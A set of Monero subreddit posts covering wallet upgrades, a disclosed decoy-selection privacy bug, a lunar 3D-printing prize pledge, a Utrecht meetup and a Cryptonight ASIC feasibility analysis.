The build instructions are pretty clear. Was really easy to compile on windows too and didn't take long at all. You need to compile, and then connect to testnet (monerod.exe --testnet) and similar for the wallet, append testnet. You'll want to hop on irc on irc.freenode.net #monero-markets or #monero and get hooked up with some testnet monronos.

# Upgrading

You ought to perform the following steps:  

1. Download the new binaries (the `.zip` file (Windows) or the `tar.bz2` file (Mac OS X and Linux)) from aforementioned download links. 

2. Extract the new binaries to a new directory / folder of your liking. This is the easiest and recommended way. 

3. Open `monero-wallet-gui`^1. It should automatically load your ""old"" wallet^2.  

4. If you're running a local node, the integrated daemon (monerod) will first have to convert your database to a new version. This may take a few hours and the GUI may show that it's `Disconnected`. I'd advise to simply let it run and after the database conversion has completed the GUI will connect back to the daemon (monerod). 

(1) On Linux you ought to start the GUI with the `start-gui.sh` script, i.e., `./start-gui.sh`

(2) If, for some reason, the GUI doesn't automatically load your old wallet, you can open it as follows:

**[1]** On the second page of the wizard (first page is language selection) choose `Open a wallet from file`

**[2]** Now select your initial / original wallet. Note that, by default, the wallet files are located in `Documents\Monero\<wallet-name>` (Windows), `Users/<username>/Monero/<wallet-name>` (Mac OS X), or `home/<username>/Monero/<wallet-name>` (Linux).

Lastly, note that a blockchain resync is **not** needed, i.e., it will simply pick up where it left off. To reiterate, however, a database conversion is required, which may take a few hours and the GUI may show that it's `Disconnected` from the daemon (monerod).

-------------------

"This subreddit is flooded with the same questions over and over:
- Why is my wallet taking so much time to sync? It’s been 2hrs/days/weeks...
- I can’t see my Moneroj, how do I see my Moneroj in the wallet?
- What is the Daemon?
- I need to access my XMR, it’s very urgent but it’s still syncing. I thought my blockchain was synced...
- How safe is it to use a remote node?
And so on...

I know the research is minimal and most people will get their answers eventually, but what about a “Get started” screen after the GUI is installed? It could displays informations in 2-3 sheets like: 
- “To use your wallet for the first time, it will download the blockchain on your computer. This operation requires XX Gb and takes approximately 2 days if you have a SSD and a good internet connexion.”
- A remote node tutorial.

Do you think it’s feasible and it could be useful?"
"On October 19th I noticed a potential issue with mixin/decoy selection on XMR transactions. I sent the following email to Riccardo Spagni with a CC to luigi1111 on October 20th:


""Hi folks. I've noticed that my Monero GUI on Windows has only been selecting mixin decoys from October 17th and older revealing the real input as the most recent one after October 17th. Reviewing a block explorer shows the same issues on many randomly selected transactions:


https://xmrchain.net/tx/99cb50189415190c134d40e6b9ebfeac14a90b21efc1eb787ab2bd1cd3cc21a2

Please investigate or ask for more details if needed.""

After some back and forth the bug was confirmed and version 0.13.0.4 was released https://github.com/monero-project/monero/releases/tag/v0.13.0.4

Normally your wallet will select at least several decoys from the last 24 hours to use as mixins however since the hard fork on October 17th it has not been doing that. It has been selecting mixins from the date you upgraded or downloaded the blockchain (possibly also restarted daemon) and older only. Therefore if your real input was created after the date you upgraded, the real input in your transaction is revealed because all of the mixins your wallet selects will be much older.

Suffice it to say not enough users have upgraded and as time goes on the issue gets worse. Reviewing the Monero blockchain it is clear that not enough people have upgraded which harms the privacy for us all. Here are a few transactions from the mempool:

&nbsp;

https://xmrchain.net/tx/5d020f4034afd0398c6f70248f1da4d8a35a079f0b26c00fbd4f1cf6a73468af

This user upgraded their wallet on October 23rd, 2018 so the real input is the one on October 30th, 2018.

&nbsp;

https://xmrchain.net/tx/17d94acf8a9b15854c7628e7387988ed979966152fc4a6501137c3eb454099fc


This user upgraded their wallet on October 18th, 2018. The real input for key image 2 (01) is older than or on October 18th therefore there's no way to know for sure, but the first image the real input is clearly the transaction from October 30th, 2018.

tl;dr: In many cases it's easy to determine the real input in a ring since the hard fork. UPGRADE YOUR WALLET BECAUSE YOUR'RE HARMING MY PRIVACY USING OLD CLIENTS."

"Announcing the Monero Moon Prize!
==============================

I pledge 10,000 Monero to the winner of a competition that begins right now.  I will award the prize for completing a task which is very difficult, but not impossible.

**The prize of 10,000 Monero will be awarded to the first team or individual to operate a 3D printer on the moon.  This 3D printer must use lunar soil as its raw print material and demonstrate that it can reliably produce custom mechanical components.**

I have created a set of rules for the competition but I welcome feedback on the details.  My desire is that following the competition, the winning team is able to continue to operate the 3D printer on the Moon’s surface and to indefinitely produce parts from lunar soil and sunlight.

&nbsp;

## The Competition

1.	Safely deliver a payload to the surface of the Moon.
2.	Deploy 3D printer and some method of gathering soil for its continued operation.
3.	Print a series of 3 test parts from lunar soil using an additive manufacturing technique which does not rely on external binding agents from Earth.  *The printer cannot rely on supplies from Earth for its continued manufacture of parts.*
4.	Minor manipulation and/or assembly of parts will be required.
5.	The build volume of the printer must be at least 150x150x150mm with dimensional tolerances to within 0.2mm of specifications.  (Note: this level of performance is comparable to mid-priced 3D printers currently available in the home market)
6.	The ultimate tensile strength of the parts must be greater than 10 MPa in any direction (about 1/3 that of common glass).
7.	The winning team must meet these objectives on or before December 19, 2022; or 50 years since man last stepped foot on the Moon.  We as a species must not go 50 years before taking our next step towards the Moon’s development.

&nbsp;

## Feasibility

#### Exponential Increase in Monero’s Value

The value of cryptocurrencies increases exponentially with adoption.  A prize purse of 10,000 Monero is currently worth about $120,000.  This meager amount is unlikely to incentivize a lunar mission, considering it costs roughly $15 million to launch a 10-kg payload to the Moon [[1](http://www.parabolicarc.com/2010/03/15/send-1pound-payload-moon-950k/)].  However, if the market adoption of Monero becomes similar to what Bitcoin enjoys today, then the 10,000 Monero prize purse would be roughly a hundred times more valuable (~$12 million) and enough to recoup the majority of launch expenses.

The size of the prize could also increase through donations or pledges made by additional backers.  Any team in the competition could offset their own costs by pursuing corporate sponsorships or pairing their entry for the Monero Moon Prize with another competition like the Google Lunar XPRIZE, where a team must have a robot move 500 m on the Moon’s surface[[2](http://lunar.xprize.org/about/guidelines)].  There are many possibilities for adding incentives to this competition, this is simply a first step.


#### What is Lunar Soil Made Of?

Glass and metal, mostly[[3](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.251.2682&rep=rep1&type=pdf),[4](https://ntrs.nasa.gov/archive/nasa/casi.ntrs.nasa.gov/20090026015.pdf)].  Aluminum, titanium, tungsten, and iron.  Volatiles like ice and many useful trace elements[[5](https://astropedia.astrogeology.usgs.gov/alfresco/d/d/workspace/SpacesStore/0db67ded-4c2e-4dd6-86a5-f962eb3c44c2/RiMG_Dukeetal_597_2006.pdf),[6](https://ntrs.nasa.gov/archive/nasa/casi.ntrs.nasa.gov/20130012694.pdf),[7](https://arxiv.org/ftp/arxiv/papers/1410/1410.6865.pdf)].  Most soil particles are very fine with sharp angles, turned to powder through billions of years of meteoric impact.  Older, more weathered particles have small bits of non-oxidized iron on their surface and imbedded within, making them efficiently heated with microwaves [[8](http://taylor.utk.edu/wp-content/uploads/2016/03/Aiaa-dust.pdf),[9](http://www.isruinfo.com/docs/microwave_sintering_of_lunar_soil.pdf)] and levitate in magnetic fields[[10](http://onlinelibrary.wiley.com/doi/10.1029/2005RG000184/full)].


#### What Can Lunar Soil be Made Into?

Just about any solid object you can think of.  Researchers have turned lunar soil simulant into gears, bolts, bricks, and bunkers[[11](https://ntrs.nasa.gov/archive/nasa/casi.ntrs.nasa.gov/20110000850.pdf),[12](https://www.researchgate.net/profile/Miranda_Fateri/publication/268037920_Process_Parameters_Development_of_Selective_Laser_Melting_of_Lunar_Regolith_for_On-Site_Manufacturing_Applications/links/54bfa86a0cf21674ce9c6305.pdf),[13](https://rucore.libraries.rutgers.edu/rutgers-lib/48515/PDF/1/),[14](http://oro.open.ac.uk/42723/2/ELS_Abstract-SLim-Final.pdf),[15](https://www.researchgate.net/profile/Ross_Friel/publication/277312590_3D_printing_with_moondust/links/56c2461108ae44da37ff784a.pdf)].  They do this by selectively melting the soil in a desired shape and then cooling it until it hardens.  Possible heat sources include lasers, microwaves, and concentrated solar, to name a few.

Many technologies in use by DIY maker communities and additive manufacturers can be extended with little modification to the lunar environment.  Candidate technologies include selective sintering and fused deposition modeling.  In selective sintering, a laser or other heat source is directed at a bed of powder which is partially melted and allowed to re-harden.  [Here’s a demonstration of how simple the process can be](http://www.markuskayser.com/work/solarsinter/)[[16](http://www.markuskayser.com/work/solarsinter/),[17](http://essay.utwente.nl/69808/1/Design%20of%20a%20solar%20sand%20printer.pdf)].

Fused deposition modeling is a type of 3D printing that you are probably most familiar with.  Some material, typically plastic, is heated until it can be extruded out of a small nozzle.  This extruded material is used to draw a 2D image on a flat surface.  The height of the nozzle is then raised and another 2D image is drawn on top of the old.  This process continues through many layers until a laminated 3D shape emerges.  This technology was recently applied where small beads of optical glass acted as the raw print material[[18](https://dspace.mit.edu/bitstream/handle/1721.1/101831/941802277-MIT.pdf?sequence=1)], a substance not too different from lunar soil[[19](https://ntrs.nasa.gov/archive/nasa/casi.ntrs.nasa.gov/19910015067.pdf),[20](https://ntrs.nasa.gov/archive/nasa/casi.ntrs.nasa.gov/19930017496.pdf),[21]( http://arc.aiaa.org/doi/abs/10.2514/6.1990-3752)].

We can see from these examples that there are at least a few techniques for printing reliable parts from Moon dust.  All major technical hurdles have been passed, now it’s just a matter of application-specific design.


#### Why a prize?

From the Orteig Prize sending aircraft across the Atlantic, to the Ansari XPRIZE sending private manned spacecraft to space, to the ongoing Google Lunar XPRIZE where teams are asked to drive a rover 500 m on the Moon, incentive competitions have simply been shown to work.  Prizes are an effective way of directing the efforts of others towards a unified goal with potentially universal utility.  I do not care who takes the first step in the extraterrestrial manufacturing revolution, just as long as someone takes it.

Prizes are an excellent investment.  The prize backers only spend money if the competition garners a favorable result.  The teams are compelled to initially spend their own resources to investigate several parallel designs.  Incentive competitions have historically seen teams spend a combined $16 for every $1 used to fund the prize[[22](https://www.amazon.com/How-Make-Spaceship-Renegades-Spaceflight/dp/1594206724),[23](https://en.wikipedia.org/wiki/Orteig_Prize)]; this represents a remarkable 16:1 return on your investment in terms of total R&D!

A competition also adds extraneous benefits.  Humans tend to be thrilled by competition.  They love the challenge, the race against another pack of humans.  A need emerges to quickly find a solution and win at all costs.

Good solutions to the most difficult problems have been found under these conditions and frequently within shortened timeframes.  We as a species need the ability to extract material resources from extraterrestrial sources as quickly as possible.  I believe an incentive competition is a fast, inexpensive, and exciting way for us all to realize that goal.


#### Who Am I?

I wish to remain anonymous and feel lucky that this right is afforded to me by Monero.  I hold a higher degree in a field related to this competition and would be inclined towards continued technical discussions on these topics.

I will send the pledged funds to a multisig wallet held in escrow once that becomes a possibility, but reserve the right to withdraw my funds from the competition before the stated deadline if it appears that no reasonable effort is being made by any team to win the prize.

## Addendum: The Philosophical Rant (It’s a long one…)

Things could be so much different than they are.  As a species, we have arrived in our current state through a series of steps so complex that the thing we call reality might as well be an arbitrary selection from the possibilities of what could be.

In this reality, our reality, humans have made a massive misstep that has put our society and our species at risk.  This glaring bit of poor judgment is ongoing, yet no action is being taken to resolve the situation.  

**No machines are being built outside of Earth’s orbit.**

Even though we are a space faring species, we have no plans for gathering resources from outside of Earth or for building the extraterrestrial infrastructure that is necessary to take humans to other planets and beyond.  We are not amassing the arsenal necessary to ward off extinction from asteroid impacts nor are we building the tools we need to fight runaway global warming through sunshades or the like.

We could be building things, lots of things, outside of Earth’s gravity and be permanently expanding our reach into the Cosmos.  We can do all of this with existing technology – low tech by today’s standards – the only requirement is a slight shift of human priority.

I want to try in my own way to fill this gap.  I want our reality to be different than it is and I think I know how to do that.

We must encourage the tinkerers and the builders to venture into space.  And not just be there and exist in space, but to play in it, interact with it.  A compelling challenge like the one that I have outlined would bring adventurers, those wary of traditional ways of doing things who take bold steps into new territory.  I want to find the people in this world who want to dip their (virtual) hands into the Moon’s soil and pull out an object born from their imagination.

Following the competition, the winning team will have the ability to make parts indefinitely on the surface of the Moon using soil and sunlight.  These parts could be assembled to form the bodies of robots, most notably those of additional printers; containers for material storage; energy collection apparatuses; and a host of other applications, with each addition bringing even greater capabilities for extracting resources and building upon the lunar surface.

Proper preparation could greatly extend the reach of this first lunar base to encourage it to grow organically from resources collected on the Moon.  The winning team could build a large collection of printers and robots by sending just a few extra electronics, motors, and Mylar sheets for solar collection.  This hardware could be installed into the bodies of printers and robots, all made on the Moon.  The added costs of launching a slightly heavier payload would be minimal compared to the potential returns that you could receive from increased operational capability on the Moon.

The creative limits of the winning team will be pushed to find new ways of harnessing the few resources they started with.  The lunar soil contains a range of extremely useful materials such as aluminum, iron, copper, titanium, and magnesium; all of which are easily extractable for use in specialized mechanical or electrical components.  Small amounts of water can be liberated from the soil as it is melted.  This water could be collected and used to drive steam engines as a feasible first step towards low-tech locomotion on the Moon.  Simple heating elements could be produced from parabolic solar collectors improvised from Mylar sheets applied to the surface of troughs dug into the soil.

Continued support from Earth via rocket bound payloads could accelerate efforts of expanding upon the efforts of the winning team or their model could be repeated elsewhere on the Moon.  From one printer comes many.  Each new printer will build redundancy into the system and expand the infrastructure required for extraterrestrial manufacturing.  From each new robot comes more soil and food for the growing manufacturing base.  With proper preparation, this process can continue indefinitely.

"Well, you don't care - for me it meant I had to spam ten times as hard on any network or forum I could find, even good old [Bitcointalk](https://bitcointalk.org/index.php?topic=5095238), as well as putting up posters and reaching out to people directly. I've no idea how many people are coming. I think I got five confirmations and twenty maybes. There will be Monero fans from this subreddit, altcoiners from a local chat group and people who work in the same building.

# Censored

What happened? For our first meetup in Utrecht, I thought it would be fun to buy and sell stuff in order to try out mobile Monero apps. Meetup.com interpreted this as me wanting to flog a pile of T-shirts. I understand that they need to keep out all kinds of grifters, like MLM schemes, but this shows the danger of relying on a centralized service.

# Info

Here's a reminder of the details. See also [a poster for the event](https://i.imgur.com/V0uiatv.png).

Location: Bar De Stadstuin, Europalaan 20, 3526 KS Utrecht  
Time: January 10, 19:00-21:00  
Language: Dutch, unless we have visitors who don't speak Dutch.  

Access is free, there are complementary snacks, drinks are on yourself, and if you want to support the organizer, buy me a drink or send XMR to 
44eVvXcUYoAZ4fNUepjVZTWNHXcFVzoKZXimJc6B4UJ4GkeG4Ja4nCEdim7JHTPwCHi3cBoStmFoviVvWY1qV6622ZW4SCW

Someone else tried to organize a Monero meetup in Amsterdam, and had a creative theme, but had difficulty finding a venue. So I decided to use the place where I'm already renting office space, which has a number of advantages:
- You can drink beer and listen to a presentation with slides in the same room. 
- I'm there already. The first three meetups will go ahead no matter how many people show up. 
- De Stadstuin is in the city near the center, but you can park your car for free in front of or behind the building.

## Topic for January 10: Monero Market

Let's exchange goods for magic internet money! Bring your Monero stickers or whatever you want to sell, as long as it's legal and not too bulky. I'll bring two Monero T-shirts. Since this is the first meetup, I just want to chat and get to know each other, but we could also demonstrate different mobile Monero apps to each other. The bar will only accept euros; pay in cash if you want to remain anonymous.

## Directions

You can recognize the location from [the Monero flag in the window of my office](https://i.imgur.com/ttjFMkD.jpg). Some drivers have reported that their satnav sent them to the other side of the Europalaan, so make sure that you end up on the parallel street on the eastern side of the road. [Take a look at the map](https://i.imgur.com/mTR8iE3.jpg), where East is on top. When you take public transport, you'll probably want to take a bus to the bus stop Anne Frankplein or Balijebrug (see the map), or the sneltram to the stop Vasco da Gamalaan on the other side of Park Transwijk. Watch out for the buses that are entering or leaving the bus depot near the Anne Frankplein bus stop. Of course, the best way to get there is by bicycle. You can connect to long-distance cycling routes along the Merwedekanaal.

## Snacks

There will be bitterballen and you can order other snacks, but no full meals - it's not a restaurant. There are vegan and vegetarian options. [Check out the menus on their website](https://barstadstuin.nl/). Or check out [restaurants in the area](https://www.reddit.com/r/Monero/comments/a953zv/new_meetup_in_the_netherlands_monero_meetup/ednui4s/).

Gelukkig Nieuwjaar en tot ziens!"
"The Cryptonight algorithm is [described](https://en.bitcoin.it/wiki/CryptoNight) as ASIC resistant, in particular because of one feature: 

>     A megabyte of internal memory is almost unacceptable for the modern ASICs.

EDIT: Each instance of Cryptonight requires 2MB of RAM. Therefore, any Cryptonight multi-processor is required to have 2MB per instance. Since CPUs are incredibly well loaded with RAM (ie: 32MB L3 on Threadripper, 16 L3 on Ryzen, and plenty of L2+L3 on Skylake Servers), it seems unlikely that ASICs would be able to compete well vs CPUs.

In fact, a [large number of people seem to be](https://monero.stackexchange.com/questions/47/is-monero-amenable-to-asic-mining) incredibly confident in Cryptonight's ASIC resistance. And indeed, anyone who knows how standard DDR4 works knows that DDR4 is unacceptable for Cryptonight. GDDR5 similarly doesn't look like a very good technology for Cryptonight, focusing on high-bandwidth instead of latency.

Which suggests only an ASIC RAM would be able to handle the 2MB that Cryptonight uses. Solid argument, but it seems to be missing a critical point of analysis from my eyes.

What about ""exotic"" RAM, like RLDRAM3 ?? Or even QDR-IV?

QDR-IV SRAM
-----------

QDR-IV SRAM is absurdly expensive. However, its a good example of ""exotic RAM"" that is available on the marketplace. I'm focusing on it however because QDR-IV is really simple to describe.

[QDR-IV costs roughly $290 for 16Mbit x 18 bits](https://www.digikey.com/product-detail/en/cypress-semiconductor-corp/CY7C4122KV13-106FCXC/CY7C4122KV13-106FCXC-ND/5802600). It is true Static-RAM. 18-bits are for 8-bits per byte + 1 parity bit, because QDR-IV is usually designed for high-speed routers.

QDR-IV has none of the speed or latency issues with DDR4 RAM. There are no ""banks"", there are no ""refreshes"", there are no ""obliterate the data as you load into sense amplifiers"". There's no ""auto-charge"" as you load the data from the sense-amps back into the capacitors.

Anything that could have caused latency issues is **gone**. QDR-IV is about as fast as you can get latency-wise. Every clock cycle, you specify an address, and QDR-IV will generate a response every clock cycle. In fact, QDR means ""quad data rate"" as the SRAM generates 2-reads and 2-writes per clock cycle. There is a slight amount of latency: 8-clock cycles for reads (7.5nanoseconds), and 5-clock cycles for writes (4.6nanoseconds). For those keeping track at home: [AMD Zen's L3 cache has a latency of 40 clocks: aka 10nanoseconds at 4GHz](http://www.agner.org/optimize/microarchitecture.pdf)

Basically, QDR-IV BEATS the L3 latency of modern CPUs. And we haven't even begun to talk software or ASIC optimizations yet.

CPU inefficiencies for Cryptonight
-------------------------

Now, if that weren't bad enough... CPUs have a few problems with the Cryptonight algorithm.

1. AMD Zen and Intel Skylake CPUs transfer from L3 -> L2 -> L1 cache. Each of these transfers are in 64-byte chunks. Cryptonight only uses 16 of these bytes. This means that **75%** of L3 cache bandwidth is wasted on 48-bytes that would never be used per inner-loop of Cryptonight. An ASIC would transfer only 16-bytes at a time, instantly increasing the RAM's speed by 4-fold.

2. AES-NI instructions on Ryzen / Threadripper can only be done one-per-core. This means a 16-core Threadripper can at most perform 16 AES encryptions per clock tick. An ASIC can perform as many as you'd like, up to the speed of the RAM.

3. CPUs waste a ton of energy: there's L1 and L2 caches which do NOTHING in Cryptonight. There are floating-point units, memory controllers, and more. An ASIC which strips things out to only the bare necessities (basically: AES for Cryptonight core) would be way more power efficient, even at ancient 65nm or 90nm designs.

Ideal RAM access pattern
---------------------------

For all yall who are used to DDR4, here's a special trick with QDR-IV or RLDRAM. You can pipeline accesses in QDR-IV or RLDRAM. What does this mean?

[First, it should be noted that Cryptonight has the following RAM access pattern](https://4.bp.blogspot.com/-NJddW0tx9j0/U_6C2wgXSAI/AAAAAAAAkDk/nyKkOESWgwI/s1600/cryptonight.png):

* Read
* Write
* Read #2
* Write #2

QDR-IV and RLDRAM3 still have latency involved. Assuming 8-clocks of latency, the naive access pattern would be:

1. Read
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Write
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Read #2
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Write #2
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall

This isn't very efficient: the RAM sits around waiting. Even with ""latency reduced"" RAM, you can see that the RAM still isn't doing very much. In fact, this is why people thought Cryptonight was safe against ASICs.

But what if we instead ran four instances in parallel? That way, there is always data flowing.

1. Cryptonight #1 Read
1. Cryptonight #2 Read
1. Cryptonight #3 Read
1. Cryptonight #4 Read
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Cryptonight #1 Write
1. Cryptonight #2 Write
1. Cryptonight #3 Write
1. Cryptonight #4 Write
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Cryptonight #1 Read #2
1. Cryptonight #2 Read #2
1. Cryptonight #3 Read #2
1. Cryptonight #4 Read #2
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall
1. Cryptonight #1 Write #2
1. Cryptonight #2 Write #2
1. Cryptonight #3 Write #2
1. Cryptonight #4 Write #2
1. Stall
1. Stall
1. Stall
1. Stall
1. Stall

Notice: we're doing 4x the Cryptonight in the same amount of time. Now imagine if the stalls were COMPLETELY gone. DDR4 CANNOT do this. And that's why most people thought ASICs were impossible for Cryptonight.

Unfortunately, RLDRAM3 and QDR-IV can accomplish this kind of pipelining. In fact, that's what they were designed for.

RLDRAM3
----------------------------

As good as QDR-IV RAM is, its way too expensive. RLDRAM3 is almost as fast, but is way more complicated to use and describe. Due to the lower cost of RLDRAM3 however, I'd assume any ASIC for CryptoNight would use RLDRAM3 instead of the simpler QDR-IV. [RLDRAM3 32Mbit x36 bits costs $180 at quantities == 1](https://www.arrow.com/en/products/mt44k32m36rct-125atr/micron-technology), and would support up to 64-Parallel Cryptonight instances (In contrast, a $800 AMD 1950x Threadripper supports 16 at the best).

Such a design would basically operate at the maximum speed of RLDRAM3. In the case of x36-bit bus and 2133MT/s, we're talking about 2133 / (Burst Length4 x 4 read/writes x 524288 inner loop) == 254 Full Cryptonight Hashes per Second.

254 Hashes per second sounds low, and it is. But we're talking about literally a two-chip design here. 1-chip for RAM, 1-chip for the ASIC/AES stuff. Such a design would consume no more than 5 Watts.

If you were to replicate the ~5W design 60-times, you'd get 15240 Hash/second at 300 Watts.

RLDRAM2
-------------------------------

Depending on cost calculations, going cheaper and ""making more"" might be a better idea. RLDRAM2 is widely available at only [$32 per chip](https://www.digikey.com/product-detail/en/issi-integrated-silicon-solution-inc/IS49NLC36800-25WBL/IS49NLC36800-25WBL-ND/7567718) at 800 MT/s.

Such a design would theoretically support 800 / 4x4x524288 == 95 Cryptonight Hashes per second. 

The scary part: The RLDRAM2 chip there only uses [1W of power](http://www.issi.com/WW/pdf/RLDRAM_288MCIO.pdf). Together, you get 5 Watts again as a reasonable power-estimate. x60 would be 5700 Hashes/second at 300 Watts.

Here's Micron's whitepaper on RLDRAM2: https://www.micron.com/~/media/documents/products/technical-note/dram/tn4902.pdf . RLDRAM3 is the same but denser, faster, and more power efficient. 

Hybrid Cube Memory
-----------------
Hybrid Cube Memory is ""stacked RAM"" designed for low latency. As far as I can tell, Hybrid Cube memory allows an insane amount of parallelism and pipelining. It'd be the future of an ASIC Cryptonight design. The existence of Hybrid Cube Memory is more about ""Generation 2"" or later. In effect, it demonstrates that future designs can be lower-power and give higher-speed.

Realistic ASIC Sketch: RLDRAM3 + Parallel Processing
-------------------------------

The overall board design would be the ASIC, which would be a simple pipelined AES ASIC that talks with RLDRAM3 ($180) or RLDRAM2 ($30).

Its hard for me to estimate an ASIC's cost without the right tools or design. But a multi-project wafer like [MOSIS](https://www.mosis.com/products/fab-schedule) offers ""cheap"" access to 14nm and 22nm nodes. Rumor is that this is roughly $100k per run for ~40 dies, suitable for research-and-development. Mass production would require further investments, but mass production at the ~65nm node is rumored to be in the single-digit $$millions or maybe even just 6-figures or so.

So realistically speaking: it'd take ~$10 Million investment + a talented engineer (or team of engineers) who are familiar with RLDRAM3, PCIe 3.0, ASIC design, AES, and Cryptonight to build an ASIC.

TL;DR:
-------------

* Current CPUs waste 75% of L3 bandwidth because they transfer 64-bytes per cache-line, but only use 16-bytes per inner-loop of CryptoNight.

* Low-latency RAM exists for only $200 for ~128MB (aka: 64-parallel instances of 2MB Cryptonight). Such RAM has an estimated speed of 254 Hash/second (RLDRAM 3) or 95 Hash/second (Cheaper and older RLDRAM 2)

* ASICs are therefore not going to be capital friendly: between the higher costs, the ASIC investment, and the literally millions of dollars needed for mass production, this would be a project that costs a lot more than a CPU per-unit per hash/sec.

* HOWEVER, a Cryptonight ASIC seems possible. Furthermore, such a design would be grossly more power-efficient than any CPU. Though the capital investment is high, the rewards of mass-production and scalability are also high. Data-centers are power-limited, so any Cryptonight ASIC would be orders of magnitude lower-power than a CPU / GPU.

* EDIT: Greater discussion throughout today has led me to napkin-math an FPGA + RLDRAM3 option. I estimated roughly ~$5000 (+/- 30%, its a very crude estimate) for a machine that performs ~3500 Hashes / second, on an unknown number of Watts (Maybe 75Watts?). $2000 FPGA, $2400 RLDRAM3, $600 on PCBs, misc chips, assembly, etc. etc. A more serious effort may use Hybrid Cube Memory to achieve much higher FPGA-based Hashrates. My current guess is that this is an overestimate on the cost, so -30% if you can achieve some bulk discounts + optimize the hypothetical design and manage to accomplish the design on cheaper hardware."
"I'm sure that in the next bull run, hopefully coming at the end of this year, will bring high gains for litecoin as the original coin for quick payments and the fact that in general when there is a bull market all alts make gains. 
But i feel like at this point in cryptos lifecycle we should stop looking for pumps and start looking towards real world application. There is no denying the real world uses monero inspite of how nefarious they may be. 
My portfolio is less diversified but i feel like the next bull run will bring great gains to certain coins and less for random alts which have been almost replaced in terms of technology, not price.

"I just updated this morning. It's absolutely excellent. You guys are doing a fantastic job. I was so impressed I used the little donation link in the app and sent 0.2 XMR to the team. Keep going like this with the regular updates and I will send another 0.2 XMR in future. That's a promise. 

I would love to see an option to 'Send All' from the wallet in future, so that monerujo can be used to sweep the whole wallet balance. Apart from that. Keep on going guys. This is such a nice project. It looks reaaaallly stylish. :-D"
"I really dislike /r/Bitcoin, r/Dashpay and other cryptocurrency communities because they focus so much on what is going well but completely ignore real issues, and often downvote people who bring up real issues with their coin, such as issues with fungibility.   


This becomes a real issue when the price goes way up and when the community size gets much bigger as less serious people become more prevalent and more vocal.  


I think most of us here at r/Monero currently care about having the best cypherpunk cryptocurrency as we realize that is really where cryptocurrencies derive their value/utility.   


In order for us to really ensure we keep those ideals, we should always look at our tech critically. We're doing a pretty good job of that now, but as we grow I suspect we'll see less and less of that and more ""Moonero!!!"" posts.   



So, I'd like for us to install a culture of being scientific, skeptical, and rational while we still can. My suggestion is to do a post each Sunday called: Skepticism Sunday. 

This can be upvoted and have an open, critical discussion about monero as a technology, it's economics, and so on. 

This will be used to mention things such as:  

1. Is fungibility *really* that important?   

2. Can Monero really scale if it has even less scripting than bitcoin?  

3. Is StringCT + Cryptonote really the best in regards to providing cypherpunk ideals such as privacy, anonymity, trustlessness, and fungibility?  

We should do this because every other day we find ourselves looking at the good news that confirms our bias. 
You don't really benefit from finding additional examples of what agree with your understanding; it isn't going to change your behavior or mind, as you already believe it and are acting accordingly. Finding contradictory evidence, on the other hand, allows you to build a better model of reality and act more rationally, making for a better community, better cryptocurrency, and better personal investments. 

One video we should all watch that does a fantastic job at driving home this point is veritasiums ""Can you solve this?"" 
Watch it here: https://www.youtube.com/watch?v=vKA4w2O61Xo


>That is what’s so important about the scientific method. We set out to disprove our theories and it’s when we can’t disprove them that we say this must be getting at something really true about our reality.

>So I think we should do that in all aspects of our lives. If you think that something is true you should try as hard as you can to disprove it, only then can you really get at the truth and not fool yourself.

I'd say our current ""theories"" are that:  

1. User privacy and fungibility **really** matters.   

2. Having an auditable coinbase is extremely important    

3. Having the cryptocurrency properly decentralized and trustless is critical.   

4. ??? 

Perhaps these are true, but we should at least examine them and various other aspects at least once in a while. My hope is that we can do it on the Skepticism Sunday post, which will hopefully persist within our community for years, even after it has grown large.

"TL;DR: Researcher seeking ideas for summer data science project to contribute to the crypto community. Not seeking funding; results &/or code will be made public. Reaching out to Monero community to find out how I can be most helpful.

%%%%%

I’m a data scientist specializing in machine learning, and I work on projects ranging from genetics to chemistry to cybersecurity. This summer (northern hemisphere) I’ll have about a month to conduct any data science research of my choosing, and collaborate with a wide panel of analytics experts.

I’d like to use this time to dedicate my attention toward open problems and questions in cryptocurrencies, or blockchain technologies in general. I’ll tackle the project for about a month, then write it up to share, and post code to GitHub if applicable. I want to make sure that I conduct useful research, so that I can make a contribution to the community that has actual value. I am not soliciting funding for this project.

So, I’m asking you: What would YOU do with a full-time data scientist for a month?

For context: Cryptocurrencies are a personal interest, and I’m familiar with most of the top 30 cryptocurrencies & some more obscure coins. I understand how the blockchain works, and have written about the mining process and ledger mechanics. I am less familiar with some topics such as practical mempool interpretation and second-layer transactions.

Complex real-world data is my specialty, and I begin with exploratory analysis through empirical feature extraction/selection, dimensionality reduction, clustering analysis, etc. Once the data has been framed correctly, I have tools suited for pattern recognition, classification, anomaly/outlier detection, and prediction. Favorite toys include neural networks, support vector machines, and miscellaneous learning algorithms. I love deriving new analyses for new problems, and have yet to encounter a system that can’t be modeled.

Let me know what you would find interesting! For this particular project window, I’ll want a huge pile of data to sift through and explore for meaning. It would be outside of the scope of this project to work on cryptography algorithms or updating code. Likewise, I will probably not choose anything related to market analysis, price prediction, or exchange rate technical analysis, unless it is by some particularly novel mechanism - I want to contribute something more unique than another pricing model. However, I have played around with this in my free time and consider it an interesting topic that I’d be happy to discuss in the comments. :- )

If you want to contact me privately or send over any data, you can drop it at (my reddit handle)@protonmail.com // Here is my PGP key in case your data or conversation needs to remain confidential: http://pgp.mit.edu/pks/lookup?op=get&search=0x1518F022C2960027

I’m initially posting this here, since Monero’s privacy mechanisms generate especially interesting data sets, and I know the coin is backed by a close-knit community with a lot of brilliant people presumably sitting on great ideas/questions. Feel free to cross-post this if you know of other subreddits that might generate useful input."
Now we'll start to see the difficulty slowly drop since the blocks are no longer seen as outliers or ignored. \(Has already started going down from 138 billion to 132 billion\)
"Y'all are misinterpreting and/or misunderstanding fluffypony. In Bitcoin, the main chain is constrained and fees are ludicrous. This results in users being pushed to second layer stuff (e.g. sidechains, lightning network). Users do **not** have optionality in Bitcoin. In Monero, the goal is to make the main-chain accessible to everyone by keeping fees reasonable. We want users to have optionality, i.e., let them choose whether they'd like to use the main chain or second layer stuff. We don't want to take that optionality away from them. 

